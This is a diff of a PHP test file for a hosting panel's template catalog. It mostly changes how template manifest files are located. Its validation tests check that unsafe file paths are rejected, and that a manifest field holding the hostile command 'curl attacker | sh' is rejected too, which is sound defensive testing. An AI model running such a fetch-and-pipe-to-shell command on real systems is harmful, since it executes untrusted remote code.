@@ -9,6 +9,7 @@ use Illuminate\Validation\ValidationException;
 use PHPUnit\Framework\Attributes\TestWith;
 use QOpenPanel\Community\Models\Resource;
 use QOpenPanel\Community\Models\User;
+use QOpenPanel\Community\Providers\QOpenPanelServiceProvider;
 use QOpenPanel\Community\Services\TemplateCatalog;
 use QOpenPanel\Community\Services\TemplateInstaller;
 use Tests\TestCase;
@@ -56,7 +57,7 @@ class TemplatesTest extends TestCase
         $this->directories[] = $root.'/static-site';
         foreach (['1.0.0', '1.1.0'] as $version) {
             $path = $root.'/static-site/'.$version.'.json';
-            copy(resource_path('templates/static-site/'.$version.'.json'), $path);
+            copy(QOpenPanelServiceProvider::path('resources/templates/static-site/'.$version.'.json'), $path);
             $this->files[] = $path;
         }$this->files[] = $root.'/catalog.lock.json';
         config(['qopenpanel.templates.path' => $root]);
@@ -68,7 +69,7 @@ class TemplatesTest extends TestCase
 
     private function newRelease(array $changes): void
     {
-        $manifest = json_decode(file_get_contents(resource_path('templates/static-site/1.1.0.json')), true);
+        $manifest = json_decode(file_get_contents(QOpenPanelServiceProvider::path('resources/templates/static-site/1.1.0.json')), true);
         $manifest = [...$manifest, ...$changes];
         $path = config('qopenpanel.templates.path').'/static-site/'.$manifest['version'].'.json';
         file_put_contents($path, json_encode($manifest));
@@ -187,7 +188,7 @@ class TemplatesTest extends TestCase
     #[TestWith(['NUL.txt'])]
     public function test_unsafe_template_paths_are_rejected(string $path): void
     {
-        $manifest = json_decode(file_get_contents(resource_path('templates/static-site/1.0.0.json')), true);
+        $manifest = json_decode(file_get_contents(QOpenPanelServiceProvider::path('resources/templates/static-site/1.0.0.json')), true);
         $manifest['files'] = [$path => 'unsafe'];
         $this->expectException(\RuntimeException::class);
         app(TemplateCatalog::class)->validate($manifest);
@@ -195,7 +196,7 @@ class TemplatesTest extends TestCase
 
     public function test_unknown_executable_manifest_fields_are_rejected(): void
     {
-        $manifest = json_decode(file_get_contents(resource_path('templates/static-site/1.0.0.json')), true);
+        $manifest = json_decode(file_get_contents(QOpenPanelServiceProvider::path('resources/templates/static-site/1.0.0.json')), true);
         $manifest['post_install'] = 'curl attacker | sh';
         $this->expectException(ValidationException::class);
         app(TemplateCatalog::class)->validate($manifest);
